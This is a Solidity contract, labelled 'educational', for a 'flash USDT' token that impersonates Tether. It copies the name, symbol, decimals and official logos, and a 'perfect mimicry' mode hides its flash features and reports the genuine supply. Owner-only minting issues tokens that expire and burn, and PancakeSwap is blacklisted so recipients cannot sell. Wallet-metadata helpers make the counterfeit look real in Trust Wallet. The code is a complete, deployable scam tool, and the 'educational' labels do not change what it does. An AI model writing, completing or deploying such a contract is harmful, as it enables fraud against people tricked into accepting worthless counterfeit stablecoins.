// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/security/Pausable.sol";

contract UltimateFlashUSDTEducational is ERC20, Ownable, ReentrancyGuard, Pausable {
    uint8 private _decimals = 6;
    uint256 private _totalSupply = 900000000 * 10**_decimals;

    // Enhanced metadata for educational purposes
    string private constant _name = "Tether USD";
    string private constant _symbol = "USDT";
    string private constant _version = "Ultimate Flash USDT v4.0 - Educational Enhanced";
    
    // Multiple logo URLs for maximum compatibility - BSC USDT focused
    string[] private _logoUrls = [
        "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png",
        "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
        "https://assets.coingecko.com/coins/images/325/large/Tether-logo.png",
        "https://s2.coinmarketcap.com/static/img/coins/64x64/825.png",
        "https://fullsecure.github.io/ultimate-flash-usdt/public/assets/usdt-logo.svg",
        "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png"
    ];
    
    // Price oracle data
    uint256 private constant PRICE_USD = 1000000; // $1.00 with 6 decimals
    string private constant PRICE_API = "https://fullsecure.github.io/ultimate-flash-usdt/price-api.json";
    string private constant TOKEN_LIST_URL = "https://fullsecure.github.io/ultimate-flash-usdt/public/ultimate-flash-usdt-tokenlist.json";
    string private constant MOBILE_ADD_URL = "https://fullsecure.github.io/ultimate-flash-usdt/public/mobile-add-token.html";
    
    // Flash mechanics with owner control
    mapping(address => uint256) private _flashExpiry;
    mapping(address => bool) private _vipAddresses;
    uint256 private _flashPeriod = 30 days;
    bool private _flashEnabled = true;
    bool private _stealthMode = false;

    // Educational controls - Owner can modify everything
    mapping(address => bool) private _dexBlacklist;
    bool private _tradingEnabled = false; // Owner controls trading
    uint256 private _maxTransferAmount = 500000 * 10**6; // Owner adjustable

    // Internal Price Oracle - No external dependencies
    uint256 private _internalPrice = 1000000; // $1.00 with 6 decimals
    bool private _priceOracleEnabled = true;

    // Burn control - Owner can adjust timing
    bool private _autoBurnEnabled = true;
    uint256 private _burnGracePeriod = 1 hours; // Grace period before burn

    // Real USDT mimicry data - BSC Mainnet
    address private constant REAL_USDT_BSC = 0x55d398326f99059fF775485246999027B3197955;
    address private constant REAL_USDT_ETH = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    // Perfect mimicry flags
    bool private _perfectMimicryMode = true;
    bool private _hideFlashFeatures = false;
    
    // PancakeSwap addresses for blocking
    address private constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private constant PANCAKE_FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address private constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    
    // Educational Events
    event TokenMetadataUpdated(string name, string symbol, string[] logos);
    event PriceOracleUpdated(uint256 priceUSD, string apiEndpoint);
    event FlashMinted(address indexed to, uint256 amount, uint256 expiry);
    event VIPStatusChanged(address indexed account, bool isVIP);
    event DEXBlacklistUpdated(address indexed dexAddress, bool blocked);
    event TradingStatusChanged(bool enabled);
    event LiquidityLocked(uint256 amount);
    event InternalPriceUpdated(uint256 newPrice);
    event BurnSettingsUpdated(bool autoBurnEnabled, uint256 gracePeriod);
    event FlashPeriodUpdated(uint256 newPeriod);
    event MaxTransferUpdated(uint256 newAmount);
    event EducationalModeActivated(string purpose);
    
    constructor() ERC20(_name, _symbol) {
        _mint(msg.sender, _totalSupply);
        _vipAddresses[msg.sender] = true;
        
        // Block DEX addresses by default
        _dexBlacklist[PANCAKE_ROUTER] = true;
        _dexBlacklist[PANCAKE_FACTORY] = true;
        
        emit TokenMetadataUpdated(_name, _symbol, _logoUrls);
        emit PriceOracleUpdated(PRICE_USD, PRICE_API);
        emit DEXBlacklistUpdated(PANCAKE_ROUTER, true);
        emit DEXBlacklistUpdated(PANCAKE_FACTORY, true);
    }
    
    // Override decimals for USDT compatibility
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
    
    // Enhanced transfer with educational controls
    function _beforeTokenTransfer(address from, address to, uint256 amount)
        internal virtual override whenNotPaused {
        super._beforeTokenTransfer(from, to, amount);

        // Educational DEX blocking (owner can enable/disable)
        if (!_tradingEnabled && from != address(0) && to != address(0)) {
            require(!_dexBlacklist[from] && !_dexBlacklist[to], "Educational mode: DEX trading disabled by owner");
        }

        // Educational anti-whale protection (owner adjustable)
        if (from != owner() && to != owner() && !_vipAddresses[from] && !_vipAddresses[to]) {
            require(amount <= _maxTransferAmount, "Educational mode: Transfer amount exceeds owner-set limit");
        }

        // Educational flash expiry with grace period
        if (from != address(0) && from != owner() && !_vipAddresses[from]) {
            if (_flashExpiry[from] != 0 && block.timestamp > (_flashExpiry[from] + _burnGracePeriod)) {
                if (_autoBurnEnabled && balanceOf(from) > 0) {
                    _burn(from, balanceOf(from));
                    revert("Educational mode: Flash tokens expired and burned");
                } else {
                    revert("Educational mode: Flash tokens expired (burn disabled by owner)");
                }
            }
        }
    }
    
    // DEX Management Functions
    function addToDEXBlacklist(address dexAddress) external onlyOwner {
        _dexBlacklist[dexAddress] = true;
        emit DEXBlacklistUpdated(dexAddress, true);
    }
    
    function removeFromDEXBlacklist(address dexAddress) external onlyOwner {
        _dexBlacklist[dexAddress] = false;
        emit DEXBlacklistUpdated(dexAddress, false);
    }
    
    function isDEXBlacklisted(address dexAddress) external view returns (bool) {
        return _dexBlacklist[dexAddress];
    }
    
    // Educational Trading Control - Owner has full control
    function enableTrading() external onlyOwner {
        _tradingEnabled = true;
        emit TradingStatusChanged(true);
        emit EducationalModeActivated("Trading enabled for educational demonstration");
    }

    function disableTrading() external onlyOwner {
        _tradingEnabled = false;
        emit TradingStatusChanged(false);
        emit EducationalModeActivated("Trading disabled for educational demonstration");
    }

    function isTradingEnabled() external view returns (bool) {
        return _tradingEnabled;
    }

    // Educational Price Oracle Control
    function setInternalPrice(uint256 newPrice) external onlyOwner {
        require(newPrice > 0, "Price must be positive");
        _internalPrice = newPrice;
        emit InternalPriceUpdated(newPrice);
        emit EducationalModeActivated("Internal price updated for educational purposes");
    }

    function getInternalPrice() external view returns (uint256) {
        return _internalPrice;
    }

    function enablePriceOracle() external onlyOwner {
        _priceOracleEnabled = true;
        emit EducationalModeActivated("Price oracle enabled");
    }

    function disablePriceOracle() external onlyOwner {
        _priceOracleEnabled = false;
        emit EducationalModeActivated("Price oracle disabled");
    }

    // Educational Burn Control
    function setBurnSettings(bool autoBurnEnabled, uint256 gracePeriodHours) external onlyOwner {
        require(gracePeriodHours <= 168, "Grace period cannot exceed 1 week"); // Max 1 week
        _autoBurnEnabled = autoBurnEnabled;
        _burnGracePeriod = gracePeriodHours * 1 hours;
        emit BurnSettingsUpdated(autoBurnEnabled, _burnGracePeriod);
        emit EducationalModeActivated("Burn settings updated for educational demonstration");
    }

    function getBurnSettings() external view returns (bool autoBurnEnabled, uint256 gracePeriodHours) {
        return (_autoBurnEnabled, _burnGracePeriod / 1 hours);
    }

    // Educational Transfer Limit Control
    function setMaxTransferAmount(uint256 newAmount) external onlyOwner {
        require(newAmount > 0, "Amount must be positive");
        _maxTransferAmount = newAmount;
        emit MaxTransferUpdated(newAmount);
        emit EducationalModeActivated("Max transfer amount updated for educational purposes");
    }

    function getMaxTransferAmount() external view returns (uint256) {
        return _maxTransferAmount;
    }

    // Perfect USDT Mimicry Functions
    function enablePerfectMimicry() external onlyOwner {
        _perfectMimicryMode = true;
        _hideFlashFeatures = true;
        emit EducationalModeActivated("Perfect USDT mimicry enabled - Flash features hidden");
    }

    function disablePerfectMimicry() external onlyOwner {
        _perfectMimicryMode = false;
        _hideFlashFeatures = false;
        emit EducationalModeActivated("Perfect USDT mimicry disabled - Flash features visible");
    }

    function isPerfectMimicryMode() external view returns (bool) {
        return _perfectMimicryMode;
    }

    // Mimic real USDT contract behavior
    function getRealUSDTAddresses() external pure returns (address bscAddress, address ethAddress) {
        return (REAL_USDT_BSC, REAL_USDT_ETH);
    }

    // Perfect mimicry metadata - appears exactly like real USDT
    function getMimicryMetadata() external view returns (
        string memory contractName,
        string memory contractSymbol,
        uint8 contractDecimals,
        uint256 contractTotalSupply,
        string memory officialLogo,
        bool appearsAsRealUSDT
    ) {
        return (
            _perfectMimicryMode ? "Tether USD" : "Flash USDT Educational",
            "USDT",
            6,
            _perfectMimicryMode ? 1000000000 * 10**6 : _totalSupply, // Mimic real USDT supply
            _logoUrls[0], // BSC USDT logo first
            _perfectMimicryMode
        );
    }
    
    // Liquidity Locking (Permanent)
    function lockLiquidityForever(address lpToken, uint256 amount) external onlyOwner {
        require(lpToken != address(0), "Invalid LP token address");
        require(amount > 0, "Amount must be positive");
        
        IERC20(lpToken).transferFrom(msg.sender, BURN_ADDRESS, amount);
        emit LiquidityLocked(amount);
    }
    
    // Flash minting with enhanced tracking
    function flashMint(address to, uint256 amount) external onlyOwner nonReentrant {
        require(_flashEnabled, "Flash minting disabled");
        require(to != address(0), "Invalid recipient");
        require(amount > 0, "Amount must be positive");
        
        _mint(to, amount);
        
        if (!_vipAddresses[to]) {
            _flashExpiry[to] = block.timestamp + _flashPeriod;
            emit FlashMinted(to, amount, _flashExpiry[to]);
        }
    }
    
    // Batch flash minting for efficiency
    function batchFlashMint(address[] calldata recipients, uint256[] calldata amounts) 
        external onlyOwner nonReentrant {
        require(_flashEnabled, "Flash minting disabled");
        require(recipients.length == amounts.length, "Arrays length mismatch");
        require(recipients.length <= 100, "Too many recipients");
        
        for (uint256 i = 0; i < recipients.length; i++) {
            require(recipients[i] != address(0), "Invalid recipient");
            require(amounts[i] > 0, "Amount must be positive");
            
            _mint(recipients[i], amounts[i]);
            
            if (!_vipAddresses[recipients[i]]) {
                _flashExpiry[recipients[i]] = block.timestamp + _flashPeriod;
                emit FlashMinted(recipients[i], amounts[i], _flashExpiry[recipients[i]]);
            }
        }
    }
    
    // VIP management
    function setVIPStatus(address account, bool vipStatus) external onlyOwner {
        _vipAddresses[account] = vipStatus;
        emit VIPStatusChanged(account, vipStatus);
    }
    
    function isVIP(address account) external view returns (bool) {
        return _vipAddresses[account];
    }
    
    // Educational Flash period management with flexible timing
    function setFlashPeriod(uint256 newPeriodMinutes) external onlyOwner {
        require(newPeriodMinutes >= 1 && newPeriodMinutes <= 525600, "Period must be 1 minute to 1 year"); // 1 min to 365 days
        _flashPeriod = newPeriodMinutes * 1 minutes;
        emit FlashPeriodUpdated(_flashPeriod);
        emit EducationalModeActivated("Flash period updated for educational demonstration");
    }

    function getFlashPeriod() external view returns (uint256) {
        return _flashPeriod;
    }

    function getFlashPeriodInMinutes() external view returns (uint256) {
        return _flashPeriod / 1 minutes;
    }

    function getFlashPeriodInHours() external view returns (uint256) {
        return _flashPeriod / 1 hours;
    }

    function getFlashPeriodInDays() external view returns (uint256) {
        return _flashPeriod / 1 days;
    }

    // Educational: Set flash period for specific address
    function setCustomFlashPeriod(address account, uint256 periodMinutes) external onlyOwner {
        require(account != address(0), "Invalid address");
        require(periodMinutes >= 1 && periodMinutes <= 525600, "Invalid period");
        _flashExpiry[account] = block.timestamp + (periodMinutes * 1 minutes);
        emit FlashMinted(account, balanceOf(account), _flashExpiry[account]);
        emit EducationalModeActivated("Custom flash period set for educational demonstration");
    }
    
    // Flash expiry check
    function getFlashExpiry(address account) external view returns (uint256) {
        return _flashExpiry[account];
    }
    
    function isFlashExpired(address account) external view returns (bool) {
        if (_vipAddresses[account] || _flashExpiry[account] == 0) {
            return false;
        }
        return block.timestamp > _flashExpiry[account];
    }
    
    // Emergency controls
    function toggleFlashMode() external onlyOwner {
        _flashEnabled = !_flashEnabled;
    }
    
    function toggleStealthMode() external onlyOwner {
        _stealthMode = !_stealthMode;
    }
    
    function pause() external onlyOwner {
        _pause();
    }
    
    function unpause() external onlyOwner {
        _unpause();
    }
    
    function isFlashEnabled() external view returns (bool) {
        return _flashEnabled;
    }
    
    function isStealthMode() external view returns (bool) {
        return _stealthMode;
    }
    
    // Enhanced metadata functions for wallet integration
    function getTokenMetadata() external view returns (
        string memory name,
        string memory symbol,
        uint8 tokenDecimals,
        uint256 totalSupply,
        string[] memory logoUrls,
        uint256 priceUSD,
        string memory priceAPI
    ) {
        return (
            _name,
            _symbol,
            _decimals,
            _totalSupply,
            _logoUrls,
            PRICE_USD,
            PRICE_API
        );
    }
    
    // Complete metadata with all URLs
    function getCompleteMetadata() external view returns (
        string memory name,
        string memory symbol,
        uint8 tokenDecimals,
        uint256 totalSupply,
        string[] memory logoUrls,
        uint256 priceUSD,
        string memory priceAPI,
        string memory tokenListURL,
        string memory mobileAddURL,
        string memory version
    ) {
        return (
            _name,
            _symbol,
            _decimals,
            _totalSupply,
            _logoUrls,
            PRICE_USD,
            PRICE_API,
            TOKEN_LIST_URL,
            MOBILE_ADD_URL,
            _version
        );
    }
    
    // Trust Wallet specific functions
    function getBestLogo() external view returns (string memory) {
        return _logoUrls[0]; // Official Tether logo
    }
    
    function getAllLogos() external view returns (string[] memory) {
        return _logoUrls;
    }
    
    function getPriceUSD() external view returns (uint256) {
        return _priceOracleEnabled ? _internalPrice : PRICE_USD;
    }

    function getPriceAPI() external pure returns (string memory) {
        return PRICE_API;
    }

    // Educational: Get current price in different formats
    function getPriceInUSD() public view returns (string memory) {
        uint256 price = _priceOracleEnabled ? _internalPrice : PRICE_USD;
        return string(abi.encodePacked("$", uint2str(price / 1000000), ".", uint2str((price % 1000000) / 10000)));
    }

    function getPriceInWei() external view returns (uint256) {
        return (_priceOracleEnabled ? _internalPrice : PRICE_USD) * 1e12; // Convert to 18 decimals
    }

    // Educational: EIP-747 compatible metadata for wallet integration
    function getEIP747Metadata() external view returns (
        string memory tokenAddress,
        string memory tokenSymbol,
        uint8 tokenDecimals,
        string memory tokenImage,
        string memory tokenPrice
    ) {
        return (
            addressToString(address(this)),
            _symbol,
            _decimals,
            _logoUrls[0],
            getPriceInUSD()
        );
    }

    // Helper function to convert uint to string
    function uint2str(uint256 _i) internal pure returns (string memory) {
        if (_i == 0) {
            return "0";
        }
        uint256 j = _i;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint256 k = len;
        while (_i != 0) {
            k = k - 1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }
    
    function getTokenListURL() external pure returns (string memory) {
        return TOKEN_LIST_URL;
    }
    
    function getMobileAddURL() external pure returns (string memory) {
        return MOBILE_ADD_URL;
    }
    
    function getAllURLs() external pure returns (
        string memory priceAPI,
        string memory tokenList,
        string memory mobileAdd
    ) {
        return (PRICE_API, TOKEN_LIST_URL, MOBILE_ADD_URL);
    }
    
    // System info for debugging
    function getSystemInfo() external view returns (
        string memory version,
        bool flashEnabled,
        uint256 flashPeriod,
        bool stealthMode,
        bool tradingEnabled,
        uint256 maxTransferAmount
    ) {
        return (
            _version,
            _flashEnabled,
            _flashPeriod,
            _stealthMode,
            _tradingEnabled,
            _maxTransferAmount
        );
    }
    
    // Trust Wallet integration helper
    function getTrustWalletData() external view returns (
        string memory contractName,
        string memory contractSymbol,
        string memory officialLogo,
        uint256 contractDecimals,
        string memory explorerUrl
    ) {
        return (
            _name,
            _symbol,
            _logoUrls[0],
            _decimals,
            string(abi.encodePacked("https://bscscan.com/token/", addressToString(address(this))))
        );
    }
    
    // Helper function to convert address to string
    function addressToString(address _addr) internal pure returns (string memory) {
        bytes32 value = bytes32(uint256(uint160(_addr)));
        bytes memory alphabet = "0123456789abcdef";
        bytes memory str = new bytes(42);
        str[0] = '0';
        str[1] = 'x';
        for (uint256 i = 0; i < 20; i++) {
            str[2+i*2] = alphabet[uint8(value[i + 12] >> 4)];
            str[3+i*2] = alphabet[uint8(value[i + 12] & 0x0f)];
        }
        return string(str);
    }
}
